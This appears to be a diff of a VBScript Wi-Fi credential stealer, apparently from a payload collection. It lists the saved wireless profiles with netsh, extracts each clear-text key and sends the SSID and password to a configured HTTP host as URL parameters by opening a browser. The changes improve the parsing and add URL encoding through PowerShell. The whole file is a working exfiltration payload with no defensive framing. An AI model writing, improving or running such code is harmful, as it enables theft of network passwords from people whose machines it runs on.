@@ -9,7 +9,7 @@ HOST = "http://localhost:8000/e013-http.php"
 
 Function GetOutput(command)
   Set Shell = Wscript.CreateObject("WScript.Shell")
-  Set cmd = Shell.Exec("cmd /c  " & command)
+  Set cmd = Shell.Exec("powershell /c  " & command)
   strOut = ""
 
   Do While Not cmd.StdOut.AtEndOfStream
@@ -18,11 +18,13 @@ Function GetOutput(command)
   GetOutput=strOut
 End Function
 
-Function sendIt(wifi, passwd)
+Function sendIt(hostname, wireless, passwd)
   Set request = WScript.CreateObject("WScript.SHell")
-  request.run "cmd.exe /C start " &  HOST & "/?ssid=" & wifi & "&pass=" & passwd
+  PASS = "[uri]::EscapeDataString('" & passwd & "')"
+  WIFI = "[uri]::EscapeDataString('" & wireless & "')"
+  URL = HOST & "?cred=" & GetOutput(WIFI) & "_" & GetOutput(PASS)
+  request.run "cmd.exe /C start " & URL
   WScript.Sleep 1000
-
 End Function
 
 strText=Split(GetOutput("netsh wlan show profile"), "\n")
@@ -32,11 +34,16 @@ i = 0
 For Each x in strText
 	If i > 8 And i < Ubound(strText)-1 Then
 		Name = Split(x, ": ")(1)
-		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")(32)
-		passwd = Split(str, ": ")
-		If Ubound(passwd) Then
-			sendIt Name, passwd(1)
-		End If
+		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")
+    For Each options in str
+      options=Replace(options, " ", "")
+      If UBound(Split(options, ":")) >= 1 Then
+        If Split(options, ":")(0) = "KeyContent" Then
+          passwd = Split(options, ":")(1)
+          sendIt HOST, Name, passwd
+        End If
+      End If
+    Next
 	End If
 	i = i + 1
 Next
